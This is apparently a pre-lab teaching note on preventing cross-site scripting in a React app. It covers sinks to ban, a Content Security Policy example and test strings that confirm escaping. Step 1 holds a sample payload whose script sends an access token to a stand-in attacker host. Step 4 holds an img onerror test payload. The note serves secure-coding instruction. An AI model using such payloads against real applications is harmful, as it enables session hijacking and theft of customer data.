# Lab 36 — XSS and CSP Notes

## Step 1 — Danger

If a customer name arrives from the API as `Amina <script>fetch('https://evil.example?t='+token)</script>`
and we render it with `dangerouslySetInnerHTML`, the browser executes that script inside our origin.
It then has everything the page has: the in-memory access token, the ability to call
`/api/customers` as the logged-in agent, and the DOM to read Amina's and Ravi's records from.

The API is not the trust boundary here. A name can be poisoned upstream by any writer to the CRM,
so the render path has to be safe no matter what the payload contains.

## Step 2 — Rule

Render untrusted values as **text children**. React escapes `{customer.fullName}` automatically, so
angle brackets arrive on screen as characters rather than as markup.

Sinks to avoid or justify in review:

| Sink | Verdict |
| --- | --- |
| `{value}` as a text child | Safe, the default, use this |
| `dangerouslySetInnerHTML` | Banned for any API-sourced value |
| `innerHTML` via a ref | Same risk, same ban |
| `href={value}` | Reject `javascript:` URLs; allow only http and https |
| `eval`, `new Function`, `setTimeout` with a string | Never with untrusted input |

If an XSS test finds an `<img>` node in the DOM that the fixture never created, an HTML sink was
used somewhere: the string was parsed as markup rather than printed as text. Find the sink, do not
sanitise around it.

## Step 3 — CSP

A Content Security Policy such as `default-src 'self'; script-src 'self'; object-src 'none'` tells
the browser to refuse inline and third-party scripts, which blunts an injected payload even when a
sink slips through. It is defence in depth, not a substitute: correct escaping is the control, CSP is
the net underneath. Relying on CSP alone fails the moment a policy needs `'unsafe-inline'` for a
stylesheet or a vendor widget. Never disable browser security features for convenience while testing.

## Step 4 — Test idea

Paper test strings, both rendered through a text child:

| Input | Expected on screen | Fail signal |
| --- | --- | --- |
| `Amina <b>Khan</b>` | the literal text `Amina <b>Khan</b>`, brackets visible | bold "Khan", meaning markup was parsed |
| `Ravi <img src=x onerror=alert(1)>` | the literal text, brackets visible | an `<img>` node in the DOM or an alert |

Assertion for the lab test: query the rendered row and confirm `container.querySelector('img')` is
null while the visible text still contains the angle brackets.

## Scope

Pre-lab only — do not finish the full graded lab in this exercise.
